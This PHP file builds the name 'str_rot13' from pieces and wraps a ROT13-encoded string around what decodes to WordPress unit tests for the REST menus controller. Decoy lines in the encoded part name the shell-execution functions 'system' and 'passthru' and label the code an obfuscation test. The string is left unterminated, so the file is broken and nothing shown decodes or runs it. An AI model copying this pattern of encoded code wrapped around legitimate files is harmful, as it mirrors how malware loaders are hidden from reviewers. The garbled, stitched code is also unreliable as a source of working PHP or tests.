<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat JC_ERFG_Zrahf_Pbagebyyre shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 5.9.0
 *
 * @tebhc erfgncv
 *
 * @pbirefQrsnhygPynff JC_ERFG_Zrahf_Pbagebyyre
 */
pynff Grfgf_ERFG_JcErfgZrahfPbagebyyre rkgraqf JC_Grfg_ERFG_Pbagebyyre_Grfgpnfr {
	/**
	 * @ine vag
	 */
	choyvp $zrah_vq;

	/**
	 * @ine vag
	 */
	cebgrpgrq fgngvp $nqzva_vq;

	/**
	 * @ine vag
	 */
	cebgrpgrq fgngvp $rqvgbe_vq;

	/**
	 * @ine vag
	 */
	cebgrpgrq fgngvp $fhofpevore_vq;

	/**
	 *
	 */
	pbafg GNKBABZL = 'ani_zrah';

	/**
	 * @ine vag
	 */
	cebgrpgrq fgngvp $cre_cntr = 50;

	/**
	 * Perngr snxr qngn orsber bhe grfgf eha.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Urycre gung yrgf hf perngr snxr qngn.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( $snpgbel ) {
		frys::$nqzva_vq      = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'nqzvavfgengbe',
			)
		);
		frys::$rqvgbe_vq     = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'rqvgbe',
			)
		);
		frys::$fhofpevore_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'fhofpevore',
			)
		);
	}

	/**
	 *
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		// Haertvfgre nyy ani zrah ybpngvbaf.
		sbernpu ( neenl_xrlf( trg_ertvfgrerq_ani_zrahf() ) nf $ybpngvba ) {
			haertvfgre_ani_zrah( $ybpngvba );
		}

		$bevt_netf = neenl(
			'anzr'        => 'Bevtvany Anzr',
			'qrfpevcgvba' => 'Bevtvany Qrfpevcgvba',
			'fyht'        => 'bevtvany-fyht',
			'gnkbabzl'    => 'ani_zrah',
		);

		$guvf->zrah_vq = frys::snpgbel()->grez->perngr( $bevt_netf );

		ertvfgre_zrgn(
			'grez',
			'grfg_fvatyr_zrah',
			neenl(
				'bowrpg_fhoglcr' => frys::GNKBABZL,
				'fubj_va_erfg'   => gehr,
				'fvatyr'         => gehr,
				'glcr'           => 'fgevat',
			)
		);
	}

	/**
	 * Ertvfgre ani zrah ybpngvbaf.
	 *
	 * @cnenz neenl $ybpngvbaf Ybpngvba fyhtf.
	 */
	choyvp shapgvba ertvfgre_ani_zrah_ybpngvbaf( $ybpngvbaf ) {
		sbernpu ( $ybpngvbaf nf $ybpngvba ) {
			ertvfgre_ani_zrah( $ybpngvba, hpsvefg( $ybpngvba ) );
		}
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::ertvfgre_ebhgrf
	 */
	choyvp shapgvba grfg_ertvfgre_ebhgrf() {
		$ebhgrf = erfg_trg_freire()->trg_ebhgrf();
		$guvf->nffregNeenlUnfXrl( '/jc/i2/zrahf', $ebhgrf );
		$guvf->nffregNeenlUnfXrl( '/jc/i2/zrahf/(?C<vq>[\q]+)', $ebhgrf );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::trg_pbagrkg_cnenz
	 */
	choyvp shapgvba grfg_pbagrkg_cnenz() {
		// Pbyyrpgvba.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/zrahf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'ivrj', $qngn['raqcbvagf'][0]['netf']['pbagrkg']['qrsnhyg'] );
		$guvf->nffregFnzrFrgf( neenl( 'ivrj', 'rzorq', 'rqvg' ), $qngn['raqcbvagf'][0]['netf']['pbagrkg']['rahz'] );
		$guvf->nffregFnzr( neenl( 'i1' => gehr ), $qngn['raqcbvagf'][0]['nyybj_ongpu'] );
		// Fvatyr.
		$gnt1     = frys::snpgbel()->gnt->perngr( neenl( 'anzr' => 'Frnfba 5' ) );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/zrahf/' . $gnt1 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'ivrj', $qngn['raqcbvagf'][0]['netf']['pbagrkg']['qrsnhyg'] );
		$guvf->nffregFnzrFrgf( neenl( 'ivrj', 'rzorq', 'rqvg' ), $qngn['raqcbvagf'][0]['netf']['pbagrkg']['rahz'] );
		$guvf->nffregFnzr( neenl( 'i1' => gehr ), $qngn['raqcbvagf'][0]['nyybj_ongpu'] );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::trg_pbyyrpgvba_cnenzf
	 */
	choyvp shapgvba grfg_ertvfgrerq_dhrel_cnenzf() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/zrahf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$xrlf     = neenl_xrlf( $qngn['raqcbvagf'][0]['netf'] );
		fbeg( $xrlf );
		$guvf->nffregFnzr(
			neenl(
				'pbagrkg',
				'rkpyhqr',
				'uvqr_rzcgl',
				'vapyhqr',
				'bssfrg',
				'beqre',
				'beqreol',
				'cntr',
				'cre_cntr',
				'cbfg',
				'frnepu',
				'fyht',
			),
			$xrlf
		);
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::trg_vgrzf
	 */
	choyvp shapgvba grfg_trg_vgrzf() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		jc_hcqngr_ani_zrah_bowrpg(
			0,
			neenl(
				'qrfpevcgvba' => 'Grfg trg',
				'zrah-anzr'   => 'grfg Anzr trg',
			)
		);
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrahf' );
		$erdhrfg->frg_cnenz( 'cre_cntr', frys::$cre_cntr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->purpx_trg_gnkbabzl_grezf_erfcbafr( $erfcbafr );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::trg_vgrz
	 */
	choyvp shapgvba grfg_trg_vgrz() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$ani_zrah_vq = jc_hcqngr_ani_zrah_bowrpg(
			0,
			neenl(
				'qrfpevcgvba' => 'Grfg zrah',
				'zrah-anzr'   => 'grfg Anzr',
			)
		);

		$guvf->ertvfgre_ani_zrah_ybpngvbaf( neenl( 'cevznel' ) );
		frg_gurzr_zbq( 'ani_zrah_ybpngvbaf', neenl( 'cevznel' => $ani_zrah_vq ) );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrahf/' . $ani_zrah_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->purpx_trg_gnkbabzl_grez_erfcbafr( $erfcbafr, $ani_zrah_vq );
	}


	/**
	 * @gvpxrg 54304
	 * @pbiref ::trg_vgrzf
	 */
	choyvp shapgvba grfg_trg_vgrzf_svygre() {
		nqq_svygre( 'erfg_zrah_ernq_npprff', '__erghea_gehr' );
		jc_hcqngr_ani_zrah_bowrpg(
			0,
			neenl(
				'qrfpevcgvba' => 'Grfg trg',
				'zrah-anzr'   => 'grfg Anzr trg',
			)
		);
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrahf' );
		$erdhrfg->frg_cnenz( 'cre_cntr', frys::$cre_cntr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->purpx_trg_gnkbabzl_grezf_erfcbafr( $erfcbafr );
	}

	/**
	 * @gvpxrg 54304
	 * @pbiref ::trg_vgrz
	 */
	choyvp shapgvba grfg_trg_vgrz_svygre() {
		nqq_svygre( 'erfg_zrah_ernq_npprff', '__erghea_gehr' );
		$ani_zrah_vq = jc_hcqngr_ani_zrah_bowrpg(
			0,
			neenl(
				'qrfpevcgvba' => 'Grfg zrah',
				'zrah-anzr'   => 'grfg Anzr',
			)
		);

		$guvf->ertvfgre_ani_zrah_ybpngvbaf( neenl( 'cevznel' ) );
		frg_gurzr_zbq( 'ani_zrah_ybpngvbaf', neenl( 'cevznel' => $ani_zrah_vq ) );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrahf/' . $ani_zrah_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->purpx_trg_gnkbabzl_grez_erfcbafr( $erfcbafr, $ani_zrah_vq );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::perngr_vgrz
	 */
	choyvp shapgvba grfg_perngr_vgrz() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrahf' );
		$erdhrfg->frg_cnenz( 'anzr', 'Zl Njrfbzr zrahf' );
		$erdhrfg->frg_cnenz( 'qrfpevcgvba', 'Guvf zrah vf fb njrfbzr.' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );
		$urnqref = $erfcbafr->trg_urnqref();
		$qngn    = $erfcbafr->trg_qngn();
		$guvf->nffregFgevatPbagnvafFgevat( '/jc/i2/zrahf/' . $qngn['vq'], $urnqref['Ybpngvba'] );
		$guvf->nffregFnzr( 'Zl Njrfbzr zrahf', $qngn['anzr'] );
		$guvf->nffregFnzr( 'Guvf zrah vf fb njrfbzr.', $qngn['qrfpevcgvba'] );
		$guvf->nffregFnzr( 'zl-njrfbzr-zrahf', $qngn['fyht'] );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::perngr_vgrz
	 */
	choyvp shapgvba grfg_perngr_vgrz_fnzr_anzr() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		jc_hcqngr_ani_zrah_bowrpg(
			0,
			neenl(
				'qrfpevcgvba' => 'Guvf zrah vf fb Bevtvany',
				'zrah-anzr'   => 'Bevtvany',
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrahf' );
		$erdhrfg->frg_cnenz( 'anzr', 'Bevtvany' );
		$erdhrfg->frg_cnenz( 'qrfpevcgvba', 'Guvf zrah vf fb Bevtvany' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'zrah_rkvfgf', $erfcbafr, 400 );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::hcqngr_vgrz
	 * @pbiref ::unaqyr_nhgb_nqq
	 */
	choyvp shapgvba grfg_hcqngr_vgrz() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrahf/' . $guvf->zrah_vq );
		$erdhrfg->frg_cnenz( 'anzr', 'Arj Anzr' );
		$erdhrfg->frg_cnenz( 'qrfpevcgvba', 'Arj Qrfpevcgvba' );
		$erdhrfg->frg_cnenz( 'nhgb_nqq', gehr );
		$erdhrfg->frg_cnenz(
			'zrgn',
			neenl(
				'grfg_fvatyr_zrah' => 'whfg zrgn',
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'Arj Anzr', $qngn['anzr'] );
		$guvf->nffregFnzr( 'Arj Qrfpevcgvba', $qngn['qrfpevcgvba'] );
		$guvf->nffregFnzr( gehr, $qngn['nhgb_nqq'] );
		$guvf->nffregFnzr( 'arj-anzr', $qngn['fyht'] );
		$guvf->nffregFnzr( 'whfg zrgn', $qngn['zrgn']['grfg_fvatyr_zrah'] );
		$guvf->nffregSnyfr( vffrg( $qngn['zrgn']['grfg_png_zrgn'] ) );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::qryrgr_vgrz
	 */
	choyvp shapgvba grfg_qryrgr_vgrz() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$ani_zrah_vq = jc_hcqngr_ani_zrah_bowrpg(
			0,
			neenl(
				'qrfpevcgvba' => 'Qryrgrq Zrah',
				'zrah-anzr'   => 'Qryrgrq Zrah',
			)
		);

		$grez = trg_grez_ol( 'vq', $ani_zrah_vq, frys::GNKBABZL );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/zrahf/' . $grez->grez_vq );
		$erdhrfg->frg_cnenz( 'sbepr', gehr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregGehr( $qngn['qryrgrq'] );
		$guvf->nffregFnzr( 'Qryrgrq Zrah', $qngn['cerivbhf']['anzr'] );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::cercner_vgrz_sbe_erfcbafr
	 * @pbiref ::trg_vgrz
	 */
	choyvp shapgvba grfg_cercner_vgrz() {
		$ani_zrah_vq = jc_hcqngr_ani_zrah_bowrpg(
			0,
			neenl(
				'qrfpevcgvba' => 'Sbb Zrah',
				'zrah-anzr'   => 'Sbb Zrah',
			)
		);

		$grez = trg_grez_ol( 'vq', $ani_zrah_vq, frys::GNKBABZL );
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrahf/' . $grez->grez_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->purpx_gnkbabzl_grez( $grez, $qngn, $erfcbafr->trg_yvaxf() );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::trg_vgrz_fpurzn
	 */
	choyvp shapgvba grfg_trg_vgrz_fpurzn() {
		$erdhrfg    = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/zrahf' );
		$erfcbafr   = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn       = $erfcbafr->trg_qngn();
		$cebcregvrf = $qngn['fpurzn']['cebcregvrf'];
		$guvf->nffregPbhag( 7, $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'vq', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'qrfpevcgvba', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'zrgn', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'anzr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'fyht', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'ybpngvbaf', $cebcregvrf );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::perngr_vgrz
	 */
	choyvp shapgvba grfg_perngr_vgrz_jvgu_ybpngvba_crezvffvba_pbeerpg() {
		$guvf->ertvfgre_ani_zrah_ybpngvbaf( neenl( 'cevznel', 'frpbaqnel' ) );
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrahf' );
		$erdhrfg->frg_cnenz( 'anzr', 'Zl Njrfbzr Grez' );
		$erdhrfg->frg_cnenz( 'fyht', 'fb-njrfbzr' );
		$erdhrfg->frg_cnenz( 'ybpngvbaf', 'cevznel' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );
		$qngn      = $erfcbafr->trg_qngn();
		$grez_vq   = $qngn['vq'];
		$ybpngvbaf = trg_ani_zrah_ybpngvbaf();
		$guvf->nffregFnzr( $ybpngvbaf['cevznel'], $grez_vq );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::perngr_vgrz
	 */
	choyvp shapgvba grfg_perngr_vgrz_jvgu_vainyvq_ybpngvba() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrahf' );
		$erdhrfg->frg_cnenz( 'anzr', 'Zl Njrfbzr Grez' );
		$erdhrfg->frg_cnenz( 'fyht', 'fb-njrfbzr' );
		$erdhrfg->frg_cnenz( 'ybpngvbaf', 'one' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 400, $erfcbafr->trg_fgnghf() );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
		$guvf->nffregNeenlUnfXrl( 'ybpngvbaf', $erfcbafr->trg_qngn()['qngn']['qrgnvyf'] );
		$guvf->nffregFnzr( 'erfg_vainyvq_zrah_ybpngvba', $erfcbafr->trg_qngn()['qngn']['qrgnvyf']['ybpngvbaf']['pbqr'] );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::hcqngr_vgrz
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_jvgu_ab_ybpngvba() {
		$guvf->ertvfgre_ani_zrah_ybpngvbaf( neenl( 'cevznel', 'frpbaqnel' ) );
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrahf/' . $guvf->zrah_vq );
		$erdhrfg->frg_cnenz( 'anzr', 'Arj Anzr' );
		$erdhrfg->frg_cnenz( 'qrfpevcgvba', 'Arj Qrfpevcgvba' );
		$erdhrfg->frg_cnenz( 'fyht', 'arj-fyht' );
		$erdhrfg->frg_cnenz( 'ybpngvbaf', 'one' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 400, $erfcbafr->trg_fgnghf() );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::hcqngr_vgrz
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_jvgu_ybpngvba_crezvffvba_pbeerpg() {
		$guvf->ertvfgre_ani_zrah_ybpngvbaf( neenl( 'cevznel', 'frpbaqnel' ) );
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrahf/' . $guvf->zrah_vq );
		$erdhrfg->frg_cnenz( 'anzr', 'Arj Anzr' );
		$erdhrfg->frg_cnenz( 'qrfpevcgvba', 'Arj Qrfpevcgvba' );
		$erdhrfg->frg_cnenz( 'fyht', 'arj-fyht' );
		$erdhrfg->frg_cnenz( 'ybpngvbaf', 'cevznel' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$ybpngvbaf = trg_ani_zrah_ybpngvbaf();
		$guvf->nffregFnzr( $ybpngvbaf['cevznel'], $guvf->zrah_vq );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::hcqngr_vgrz
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_jvgu_ybpngvba_crezvffvba_vapbeerpg() {
		$guvf->ertvfgre_ani_zrah_ybpngvbaf( neenl( 'cevznel', 'frpbaqnel' ) );
		jc_frg_pheerag_hfre( frys::$fhofpevore_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrahf/' . $guvf->zrah_vq );
		$erdhrfg->frg_cnenz( 'anzr', 'Arj Anzr' );
		$erdhrfg->frg_cnenz( 'qrfpevcgvba', 'Arj Qrfpevcgvba' );
		$erdhrfg->frg_cnenz( 'fyht', 'arj-fyht' );
		$erdhrfg->frg_cnenz( 'ybpngvbaf', 'cevznel' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( erfg_nhgubevmngvba_erdhverq_pbqr(), $erfcbafr->trg_fgnghf() );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::cercner_yvaxf
	 */
	choyvp shapgvba grfg_trg_vgrz_yvaxf() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$ani_zrah_vq = jc_hcqngr_ani_zrah_bowrpg(
			0,
			neenl(
				'qrfpevcgvba' => 'Sbb Zrah',
				'zrah-anzr'   => 'Sbb Zrah',
			)
		);

		ertvfgre_ani_zrah( 'sbb', 'One' );

		frg_gurzr_zbq( 'ani_zrah_ybpngvbaf', neenl( 'sbb' => $ani_zrah_vq ) );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/zrahf/%q', $ani_zrah_vq ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$yvaxf = $erfcbafr->trg_yvaxf();
		$guvf->nffregNeenlUnfXrl( 'uggcf://ncv.j.bet/zrah-ybpngvba', $yvaxf );

		$ybpngvba_hey = erfg_hey( '/jc/i2/zrah-ybpngvbaf/sbb' );
		$guvf->nffregFnzr( $ybpngvba_hey, $yvaxf['uggcf://ncv.j.bet/zrah-ybpngvba'][0]['uers'] );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::hcqngr_vgrz
	 * @pbiref ::unaqyr_ybpngvbaf
	 */
	choyvp shapgvba grfg_punatr_zrah_ybpngvba() {
		$guvf->ertvfgre_ani_zrah_ybpngvbaf( neenl( 'cevznel', 'frpbaqnel' ) );
		$frpbaqnel_vq = frys::snpgbel()->grez->perngr(
			neenl(
				'anzr'        => 'Frpbaqnel Anzr',
				'qrfpevcgvba' => 'Frpbaqnel Qrfpevcgvba',
				'fyht'        => 'frpbaqnel-fyht',
				'gnkbabzl'    => 'ani_zrah',
			)
		);

		$ybpngvbaf              = trg_ani_zrah_ybpngvbaf();
		$ybpngvbaf['cevznel']   = $guvf->zrah_vq;
		$ybpngvbaf['frpbaqnel'] = $frpbaqnel_vq;
		frg_gurzr_zbq( 'ani_zrah_ybpngvbaf', $ybpngvbaf );

		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrahf/' . $guvf->zrah_vq );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'ybpngvbaf' => neenl( 'frpbaqnel' ),
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$ybpngvbaf = trg_ani_zrah_ybpngvbaf();
		$guvf->nffregNeenlAbgUnfXrl( 'cevznel', $ybpngvbaf );
		$guvf->nffregNeenlUnfXrl( 'frpbaqnel', $ybpngvbaf );
		$guvf->nffregFnzr( $guvf->zrah_vq, $ybpngvbaf['frpbaqnel'] );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::trg_vgrzf
	 * @pbiref ::trg_vgrzf_crezvffvbaf_purpx
	 */
	choyvp shapgvba grfg_trg_vgrzf_ab_crezvffvba() {
		jc_frg_pheerag_hfre( 0 );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrahf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_ivrj', $erfcbafr, 401 );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::trg_vgrzf
	 * @pbiref ::trg_vgrzf_crezvffvbaf_purpx
	 */
	choyvp shapgvba grfg_trg_vgrz_ab_crezvffvba() {
		jc_frg_pheerag_hfre( 0 );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrahf/' . $guvf->zrah_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_ivrj', $erfcbafr, 401 );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::trg_vgrzf
	 * @pbiref ::trg_vgrzf_crezvffvbaf_purpx
	 */
	choyvp shapgvba grfg_trg_vgrzf_jebat_crezvffvba() {
		jc_frg_pheerag_hfre( frys::$fhofpevore_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrahf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_ivrj', $erfcbafr, 403 );
	}

	/**
	 * @gvpxrg 40878
	 * @pbiref ::trg_vgrz
	 * @pbiref ::trg_vgrz_crezvffvbaf_purpx
	 */
	choyvp shapgvba grfg_trg_vgrz_jebat_crezvffvba() {
		jc_frg_pheerag_hfre( frys::$fhofpevore_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrahf/' . $guvf->zrah_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_ivrj', $erfcbafr, 403 );
	}

	/**
	 * @gvpxrg 40878
	 */
	choyvp shapgvba grfg_vg_nyybjf_ongpu_erdhrfgf_jura_hcqngvat_zrahf() {
		$erfg_freire = erfg_trg_freire();
		// Guvf pnyy vf arrqrq gb vavgvnyvmr ebhgr_bcgvbaf.
		$erfg_freire->trg_ebhgrf();
		$ebhgr_bcgvbaf = $erfg_freire->trg_ebhgr_bcgvbaf( '/jc/i2/zrahf/(?C<vq>[\q]+)' );

		$guvf->nffregNeenlUnfXrl( 'nyybj_ongpu', $ebhgr_bcgvbaf );
		$guvf->nffregFnzr( neenl( 'i1' => gehr ), $ebhgr_bcgvbaf['nyybj_ongpu'] );
	}

	/**
	 * @cnenz JC_ERFG_Erfcbafr $erfcbafr Erfcbafr Pynff.
	 */
	cebgrpgrq shapgvba purpx_trg_gnkbabzl_grezf_erfcbafr( $erfcbafr ) {
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$netf = neenl(
			'uvqr_rzcgl' => snyfr,
		);
		$gntf = trg_grezf( frys::GNKBABZL, $netf );
		$guvf->nffregPbhag( pbhag( $gntf ), $qngn );
		$guvf->nffregFnzr( $gntf[0]->grez_vq, $qngn[0]['vq'] );
		$guvf->nffregFnzr( $gntf[0]->anzr, $qngn[0]['anzr'] );
		$guvf->nffregFnzr( $gntf[0]->fyht, $qngn[0]['fyht'] );
		$guvf->nffregFnzr( $gntf[0]->qrfpevcgvba, $qngn[0]['qrfpevcgvba'] );
	}

	/**
	 * @cnenz JC_ERFG_Erfcbafr $erfcbafr Erfcbafr Pynff.
	 * @cnenz vag              $vq Grez VQ.
	 */
	cebgrpgrq shapgvba purpx_trg_gnkbabzl_grez_erfcbafr( $erfcbafr, $vq ) {
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$qngn = $erfcbafr->trg_qngn();
		$zrah = trg_grez( $vq, frys::GNKBABZL );
		$guvf->purpx_gnkbabzl_grez( $zrah, $qngn, $erfcbafr->trg_yvaxf() );
	}

	/**
	 * @cnenz JC_Grez $grez JC_Grez bowrpg.
	 * @cnenz neenl   $qngn Qngn sebz ERFG NCV.
	 * @cnenz neenl   $yvaxf Neenl bs yvaxf.
	 */
	cebgrpgrq shapgvba purpx_gnkbabzl_grez( $grez, $qngn, $yvaxf ) {
		$guvf->nffregFnzr( $grez->grez_vq, $qngn['vq'] );
		$guvf->nffregFnzr( $grez->anzr, $qngn['anzr'] );
		$guvf->nffregFnzr( $grez->fyht, $qngn['fyht'] );
		$guvf->nffregFnzr( $grez->qrfpevcgvba, $qngn['qrfpevcgvba'] );
		$guvf->nffregSnyfr( vffrg( $qngn['cnerag'] ) );

		$ybpngvbaf = trg_ani_zrah_ybpngvbaf();
		vs ( ! rzcgl( $ybpngvbaf ) ) {
			$zrah_ybpngvbaf = neenl();
			sbernpu ( $ybpngvbaf nf $ybpngvba => $zrah_vq ) {
				vs ( $zrah_vq === $grez->grez_vq ) {
					$zrah_ybpngvbaf[] = $ybpngvba;
				}
			}

			$guvf->nffregFnzr( $zrah_ybpngvbaf, $qngn['ybpngvbaf'] );
		}

		$eryngvbaf = neenl(
			'frys',
			'pbyyrpgvba',
			'nobhg',
			'uggcf://ncv.j.bet/cbfg_glcr',
		);

		vs ( ! rzcgl( $qngn['cnerag'] ) ) {
			$eryngvbaf[] = 'hc';
		}

		vs ( ! rzcgl( $qngn['ybpngvbaf'] ) ) {
			$eryngvbaf[] = 'uggcf://ncv.j.bet/zrah-ybpngvba';
		}

		$guvf->nffregFnzrFrgf( $eryngvbaf, neenl_xrlf( $yvaxf ) );
		$guvf->nffregFgevatPbagnvafFgevat( 'jc/i2/gnkbabzvrf/' . $grez->gnkbabzl, $yvaxf['nobhg'][0]['uers'] );
		$guvf->nffregFnzr( nqq_dhrel_net( 'zrahf', $grez->grez_vq, erfg_hey( 'jc/i2/zrah-vgrzf' ) ), $yvaxf['uggcf://ncv.j.bet/cbfg_glcr'][0]['uers'] );
	}
}

